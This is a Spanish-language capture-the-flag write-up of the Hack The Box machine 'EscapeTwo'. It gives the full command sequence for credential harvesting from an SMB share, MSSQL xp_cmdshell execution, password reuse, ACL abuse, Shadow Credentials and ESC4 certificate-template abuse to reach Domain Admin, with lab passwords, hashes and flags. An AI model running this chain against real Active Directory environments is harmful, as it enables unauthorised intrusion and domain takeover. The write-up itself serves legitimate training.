---
icon: windows
tags:
  - smb
  - active-directory
  - mssql
  - enumeration
  - credential-dumping
  - privilege-escalation
  - esc4
  - ad-cs-abuse
---

# EscapeTwo

## Resumen

### Detalles

| Campo                 | Detalle                                                            |
| --------------------- | ------------------------------------------------------------------ |
| **Nombre**            | EscapeTwo                                                          |
| **Sistema Operativo** | Windows Server 2019 · Build 17763                                  |
| **Plataforma**        | Hack The Box                                                       |
| **Fecha**             | 14/11/2026                                                         |
| **IP Objetivo**       | 10.129.232.128 (reconocimiento/MSSQL) · 10.129.87.169 (fase final) |

### Executive Summary

Comencé la máquina con las credenciales de `rose`, que me permitieron enumerar SMB y acceder al recurso compartido `Accounting Department`. Allí encontré un archivo Excel con varias credenciales, entre ellas las de `sa` para Microsoft SQL Server. Utilicé estas credenciales para acceder a MSSQL, habilité `xp_cmdshell` y conseguí ejecutar comandos en el sistema. Revisando el archivo de configuración de SQL Server encontré la contraseña de `sql_svc`, que también estaba reutilizada por el usuario `ryan`. Esto me permitió acceder por WinRM y obtener la flag de usuario.

Para la escalada revisé las relaciones y permisos de Active Directory. Comprobé que `ryan` podía modificar el propietario de `ca_svc`, por lo que cambié la propiedad del objeto y me concedí `FullControl`. Después utilicé Shadow Credentials para obtener el hash NT de `ca_svc`. Esta cuenta pertenecía al grupo `Cert Publishers`, lo que me permitió enumerar Active Directory Certificate Services y localizar la plantilla `DunderMifflinAuthentication`, vulnerable a ESC4. Modifiqué la plantilla, solicité un certificado indicando el UPN de `Administrator` y lo utilicé para obtener sus credenciales y acceder por WinRM.

### Técnicas

* Enumeración de usuarios y recursos compartidos SMB.
* Extracción de credenciales desde un archivo Excel.
* Acceso a Microsoft SQL Server mediante credenciales expuestas.
* Habilitación de `xp_cmdshell` y ejecución de comandos.
* Reutilización de credenciales y acceso remoto mediante WinRM.
* Abuso de permisos ACL en Active Directory (`WriteOwner` y `FullControl`).
* Shadow Credentials para obtener el hash NT de `ca_svc`.
* Enumeración y explotación de AD CS mediante ESC4.
* Solicitud de certificado para `Administrator` y acceso como administrador.

## Information Gathering

### Port Scanning

#### TCP

Comencé con un escaneo completo de puertos para identificar la superficie expuesta.

```bash
nmap -sS -Pn -n -vv --min-rate 5000 -p- 10.129.232.128
```

Después lancé un escaneo de versiones y scripts sobre los puertos encontrados.

```bash
nmap -sCV -Pn -n -v -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49693,49694,49695,49700,49721,49738 10.129.232.128 -oG allServices
```

El escaneo mostró un entorno Windows con varios servicios asociados a Active Directory. También destacaba el puerto `1433`, correspondiente a Microsoft SQL Server 2019.

| Puerto    | Servicio     | Versión                                       | Notas                              |
| --------- | ------------ | --------------------------------------------- | ---------------------------------- |
| 53/tcp    | domain       | Simple DNS Plus                               | DNS                                |
| 88/tcp    | kerberos-sec | Microsoft Windows Kerberos                    | Kerberos                           |
| 135/tcp   | msrpc        | Microsoft Windows RPC                         | RPC                                |
| 139/tcp   | netbios-ssn  | Microsoft Windows NetBIOS                     | NetBIOS                            |
| 389/tcp   | ldap         | Microsoft Active Directory LDAP               | Dominio `sequel.htb`               |
| 445/tcp   | microsoft-ds | SMB                                           | Firma SMB habilitada y obligatoria |
| 464/tcp   | kpasswd5     | Kerberos password change                      | Cambio de contraseña Kerberos      |
| 593/tcp   | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0           | RPC sobre HTTP                     |
| 636/tcp   | ssl/ldap     | Microsoft Active Directory LDAP               | LDAPS                              |
| 1433/tcp  | ms-sql-s     | Microsoft SQL Server 2019 RTM · 15.00.2000.00 | MSSQL                              |
| 3268/tcp  | ldap         | Microsoft Active Directory LDAP               | Global Catalog                     |
| 3269/tcp  | ssl/ldap     | Microsoft Active Directory LDAP               | Global Catalog sobre SSL           |
| 5985/tcp  | http         | Microsoft HTTPAPI 2.0                         | WinRM                              |
| 9389/tcp  | mc-nmf       | .NET Message Framing                          | Active Directory Web Services      |
| 47001/tcp | http         | Microsoft HTTPAPI 2.0                         | Servicio HTTP de Windows           |
| 49664/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49665/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49666/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49667/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49693/tcp | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0           | RPC sobre HTTP                     |
| 49694/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49695/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49700/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49721/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |
| 49738/tcp | msrpc        | Microsoft Windows RPC                         | Puerto RPC dinámico                |

La enumeración permitió identificar el hostname `DC01` y el dominio `sequel.htb`. Nmap también identificó Windows Server 2019, build `17763`, y confirmó que SMB signing estaba habilitado y era obligatorio.

En las evidencias de la fase final aparece la dirección `10.129.87.169`, mientras que el reconocimiento inicial y el acceso a MSSQL utilizan `10.129.232.128`. Mantengo ambas direcciones tal y como aparecen en el scratchpad.

### Enumeration

#### Web

No encontré una aplicación web tradicional durante el reconocimiento inicial. Los puertos `5985` y `47001` respondían con `Microsoft-HTTPAPI/2.0` y Nmap devolvió el título `Not Found`. Continué la enumeración por los servicios SMB y MSSQL que sí ofrecían una vía de acceso.

#### SMB

Comprobé el acceso SMB utilizando las credenciales iniciales proporcionadas.

```bash
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
```

![Validación de las credenciales iniciales de rose mediante NetExec.](<../../../.gitbook/assets/Validación de las credenciales iniciales de rose mediante NetExec..png>)

_Validación de las credenciales iniciales de rose mediante NetExec._

Las credenciales eran válidas frente al dominio `sequel.htb`. El resultado también identificó el equipo como `DC01` y mostró SMB signing habilitado.

Después enumeré los usuarios del dominio.

```bash
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --users
```

Entre los usuarios encontrados aparecían `Administrator`, `michael`, `ryan`, `oscar`, `sql_svc`, `rose` y `ca_svc`.

A continuación enumeré los recursos compartidos disponibles para `rose`.

```bash
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

| Share                 | Permisos | Notas                        |
| --------------------- | -------- | ---------------------------- |
| Accounting Department | READ     | Recurso compartido accesible |
| ADMIN$                | -        | Remote Admin                 |
| C$                    | -        | Default share                |
| IPC$                  | READ     | Remote IPC                   |
| NETLOGON              | READ     | Logon server share           |
| SYSVOL                | READ     | Logon server share           |
| Users                 | READ     | Recurso compartido accesible |

![Contenido del recurso compartido Accounting Department.](<../../../.gitbook/assets/Contenido del recurso compartido Accounting Department..png>)

_Contenido del recurso compartido Accounting Department._

Dentro de `Accounting Department` encontré los archivos `accounting_2024.xlsx` y `accounts.xlsx`. Revisé el archivo Excel descargado y comprobé que era un archivo ZIP que contenía los documentos XML habituales de una hoja de cálculo.

```bash
file 10.129.232.128-Accounting\ Department_accounts.xlsx
unzip 10.129.232.128-Accounting\ Department_accounts.xlsx
```

Al revisar `xl/sharedStrings.xml` encontré varios nombres de usuario y contraseñas. Entre ellos aparecían credenciales para `angela`, `oscar`, `kevin` y la cuenta `sa` de SQL Server.

| Usuario | Contraseña         |
| ------- | ------------------ |
| angela  | `0fwz7Q4mSpurIt99` |
| oscar   | `86LxLBMgEWaKUnBG` |
| kevin   | `Md9Wlq1E5bZnVDVo` |
| sa      | `MSSQLP@ssw0rd!`   |

Probé las credenciales recopiladas contra SMB. La autenticación de `oscar` fue válida, mientras que las otras combinaciones probadas no funcionaron frente a este servicio. La credencial de `sa` me permitió continuar por MSSQL.

```bash
nxc smb 10.129.232.128 -u users.txt -p passwords.txt
```

![Prueba de las credenciales extraídas contra SMB; oscar autentica correctamente.](<../../../.gitbook/assets/Prueba de las credenciales extraídas contra SMB; oscar autentica correctamente..png>)

_Prueba de las credenciales extraídas contra SMB; oscar autentica correctamente._

## Explotación

### Foothold

* **Vulnerabilidad:** Exposición de credenciales en el recurso compartido SMB `Accounting Department` y reutilización de la contraseña de `sql_svc` por el usuario `ryan`.
* **Exploit:** Acceso a MSSQL con la cuenta `sa`, habilitación de `xp_cmdshell` y ejecución de comandos en el sistema.
* **Procedimiento:**

1. Utilicé las credenciales de `rose` para enumerar SMB y acceder al recurso compartido `Accounting Department`. Dentro encontré un archivo Excel que contenía varias credenciales, incluida la de `sa`.
2.  Me conecté a Microsoft SQL Server con las credenciales extraídas.

    ```bash
    mssqlclient.py sequel.htb/sa:"MSSQLP@ssw0rd\!"@10.129.232.128
    ```
3.  Una vez dentro, habilité `xp_cmdshell` para poder ejecutar comandos en el sistema.

    ```sql
    sp_configure 'xp_cmdshell', '1'
    RECONFIGURE
    ```
4.  Preparé un listener en mi máquina y utilicé `xp_cmdshell` para ejecutar una reverse shell de PowerShell contra el puerto `9401`.

    ```bash
    nc -lvnp 9401
    ```
5.  Una vez dentro del sistema, revisé el archivo `sql-Configuration.INI` y encontré la contraseña configurada para la cuenta de servicio `SEQUEL\sql_svc`.

    ```ini
    SQLSVCACCOUNT="SEQUEL\sql_svc"
    SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
    ```
6.  Comprobé las credenciales contra SMB y observé que la contraseña también era válida para el usuario `ryan`.

    ```bash
    nxc smb 10.129.232.128 -u users.txt -p passwords.txt --continue-on-success
    ```

    Credenciales válidas identificadas:

    ```
    sequel.htb\oscar:86LxLBMgEWaKUnBG
    sequel.htb\rose:KxEPkKe6R8su
    sequel.htb\sql_svc:WqSZAF6CysDQbGb3
    sequel.htb\ryan:WqSZAF6CysDQbGb3
    ```
7.  Utilicé las credenciales de `ryan` para conectarme mediante WinRM.

    ```bash
    evil-winrm -i 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
    ```
8.  Desde la sesión de `ryan` leí `user.txt` y obtuve la primera flag.

    ```powershell
    type "C:/Users/ryan/Desktop/user.txt"
    ```

*   **Evidencia:** (`user.txt`)

    ```
    c65e0c571e35986c835de918b4158089
    ```

![Lectura de user.txt desde la sesión de Ryan.](<../../../.gitbook/assets/Lectura de user.txt desde la sesión de Ryan..png>)

_Lectura de user.txt desde la sesión de Ryan._

### Privesc

* **Vulnerabilidad:** Permisos ACL incorrectos sobre el objeto `ca_svc` y plantilla de AD CS vulnerable a ESC4.
* **Exploit:** Abuso de `WriteOwner`, asignación de `FullControl`, Shadow Credentials y modificación de la plantilla `DunderMifflinAuthentication` para solicitar un certificado como `Administrator`.
* **Procedimiento:**

1. Revisé las relaciones de Active Directory y observé que `ryan` tenía permisos `WriteOwner` sobre el usuario `ca_svc`.

![Relaciones de BloodHound: Ryan dispone de WriteOwner sobre ca\_svc.](<../../../.gitbook/assets/Relaciones de BloodHound Ryan dispone de WriteOwner sobre ca_svc..png>)

_Relaciones de BloodHound: Ryan dispone de WriteOwner sobre ca\_svc._

2.  Cambié el propietario del objeto `ca_svc` para que fuese `ryan`.

    ```bash
    owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
    ```
3.  Después modifiqué la DACL del objeto y concedí `FullControl` a `ryan`.

    ```bash
    dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
    ```
4.  Con estos permisos utilicé Shadow Credentials contra `ca_svc`. Certipy añadió una Key Credential, autenticó como la cuenta y consiguió recuperar su hash NT. Al terminar, restauró las Key Credentials anteriores.

    ```bash
    certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.129.87.169
    ```

    Hash NT obtenido:

    ```
    3b181b914e7a9d5508ea1e20bc2b7fce
    ```
5.  Comprobé que `ca_svc` pertenecía al grupo `Cert Publishers` y enumeré las autoridades de certificación disponibles.

    ```bash
    nxc smb 10.129.87.169 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce' -M enum_ca
    ```

    La enumeración encontró Active Directory Certificate Services y mostró el endpoint `certsrv`.

![Relación de pertenencia de ca\_svc con el grupo Cert Publishers.](<../../../.gitbook/assets/Relación de pertenencia de ca_svc con el grupo Cert Publishers..png>)

_Relación de pertenencia de ca\_svc con el grupo Cert Publishers._

6. Revisé las plantillas y encontré `DunderMifflinAuthentication`. Certipy identificó la vulnerabilidad `ESC4` asociada a los permisos de la plantilla. En el resultado aparecía `SEQUEL.HTB\Cert Publishers` tanto en `User Enrollable Principals` como en `User ACL Principals`. También comprobé que la plantilla estaba habilitada y permitía `Client Authentication`.

![Propiedades de la plantilla DunderMifflinAuthentication identificadas durante la enumeración.](<../../../.gitbook/assets/Propiedades de la plantilla DunderMifflinAuthentication identificadas durante la.png>)

_Propiedades de la plantilla DunderMifflinAuthentication identificadas durante la enumeración._

![Certipy identifica ESC4 y muestra Cert Publishers entre los principales con permisos sobre la plantilla.](<../../../.gitbook/assets/Certipy identifica ESC4 y muestra Cert Publishers entre los principales con perm.png>)

_Certipy identifica ESC4 y muestra Cert Publishers entre los principales con permisos sobre la plantilla._

7.  Modifiqué la configuración de la plantilla para aplicar la configuración por defecto vulnerable. Certipy mostró un aviso de resolución DNS para `SEQUEL.HTB`, pero confirmó que la plantilla `DunderMifflinAuthentication` se había actualizado correctamente.

    ```bash
    certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
    ```

![Modificación de la plantilla DunderMifflinAuthentication mediante Certipy.](<../../../.gitbook/assets/Modificación de la plantilla DunderMifflinAuthentication mediante Certipy..png>)

_Modificación de la plantilla DunderMifflinAuthentication mediante Certipy._

8.  Solicité un certificado utilizando el UPN de `administrator@sequel.htb`.

    ```bash
    certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.129.87.169 -dc-host dc01
    ```

    La solicitud se completó correctamente y Certipy guardó el certificado y la clave privada en `administrator.pfx`.

![Certificado solicitado correctamente para administrator@sequel.htb.](<../../../.gitbook/assets/Certificado solicitado correctamente para administrator@sequel.htb..png>)

_Certificado solicitado correctamente para administrator@sequel.htb._

9.  Utilicé el certificado para autenticarme como `Administrator` y recuperar su hash NT.

    ```bash
    certipy auth -pfx administrator.pfx -dc-ip 10.129.87.169
    ```

    Hash NT obtenido:

    ```
    7a8d4e04986afa8ed4060f75e5a0b3ff
    ```

![Autenticación con administrator.pfx y recuperación del hash NT de Administrator.](<../../../.gitbook/assets/Autenticación con administrator.pfx y recuperación del hash NT de Administrator..png>)

_Autenticación con administrator.pfx y recuperación del hash NT de Administrator._

10. Finalmente, utilicé el hash para acceder mediante WinRM como `Administrator` y leer `root.txt`.

    ```bash
    evil-winrm -i 10.129.87.169 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
    ```

    ```powershell
    type "C:/Users/Administrator/Desktop/root.txt"
    ```

*   **Evidencia:** (root.txt)

    ```
    38514f0342c5919793cf9a07702e3c8b
    ```

![Lectura de root.txt desde la sesión de Administrator.](<../../../.gitbook/assets/Lectura de root.txt desde la sesión de Administrator..png>)

_Lectura de root.txt desde la sesión de Administrator._
